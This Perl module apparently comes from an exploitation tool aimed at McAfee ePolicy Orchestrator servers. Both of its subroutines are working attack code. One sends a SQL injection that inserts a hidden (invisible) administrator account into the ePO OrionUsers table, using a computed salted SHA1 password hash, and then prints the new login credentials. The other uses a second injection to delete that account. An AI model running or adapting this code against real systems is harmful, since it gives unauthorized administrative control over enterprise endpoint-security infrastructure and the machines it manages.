package Epowner::Epo;

use MIME::Base64;
use Digest::SHA qw(sha1);
use URI::Escape;

use strict;
use warnings;


#============================================================#
# Delete our admin from the DB                               #
#============================================================#
sub mode_addadmin_clean {

        my $this = shift;

        if($this->{state_add_admin} eq 0){
                $this->print_err ("[-] ERROR (mode_addadmin_clean) : It appears that you never ran '--add-admin'. There is nothing to clean up\n");
                return 0;
        }

        # SQL Injection
        my $sqli =
                "') ; DELETE from [dbo].[OrionUsers] where Name = '$this->{admin_username}' ; -- ";


	print "[*] Removing our admin account from the ePo database\n";

        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
        if($this->send_http_request($http_request)){
		$this->print_ok ("[*] User '$this->{admin_username}' removed from the database.\n");
		
                # keep trace of this action
                $this->{state_add_admin} = 0;
        }else{
                return 0;
        }

        return 1;

	

}

#============================================================#
# Add our own admin in the database                          #
#============================================================#
sub mode_addadmin {

	my $this = shift;
	my $username = shift || random_string_alphanum_lower(6);
	my $password = shift || random_string_alphanum_lower(6);


	# we only manage one admin
	if($this->{state_add_admin}){
		$this->print_warn ("[-] WARN (mode_addadmin) : It appears that you already added a new admin\n");
		$this->print_warn ("    If you want to remove it, please use '--add-admin --clean'. Skipping request.\n");
		return 0;
	}

	$this->print_info_l1("[*] Call to ModeAddAdmin\n");
	$this->print_info_l2("    Parameters: ");
	print "Username: $username , Password: $password\n";

	# generate password hash	
	my $salt = random_string(4);					# 4 byte of salt
	my $sha1 = sha1($password . $salt);				# SHA1
	my $hash = uri_escape(encode_base64($sha1 . $salt, ""));	# URL + b64 encoding
	$hash = "auth:pwd?pwd=" . $hash; 

	# SQL Injection
	my $sqli =
                "') ; INSERT INTO [dbo].[OrionUsers] (Name, AuthURI, Admin, Disabled, Visible, Interactive, Removable, Editable) " .
                " VALUES ('$username','$hash',1,0,0,1,1,1) ; -- ";


	print "[*] Adding a new (invisible) admin in the ePo database\n";

        my $http_request = $this->mode_common_generate_fullprops_request($sqli);
        if($this->send_http_request($http_request)){

		# save it
		$this->{admin_username} = $username;
		$this->{admin_password} = $password;
		
                $this->print_ok ("[*] You should now be able to logon on https://" . $this->{server_host} . ":" . $this->{server_consoleport} . "\n");
                $this->print_ok ("[*]    Login: $this->{admin_username}\n");
                $this->print_ok ("[*]    Passw: $this->{admin_password}\n");
	
		# keep trace of this action
		$this->{state_add_admin} = 1;

        }else{
                return 0;
        }

	return 1;

}
1;
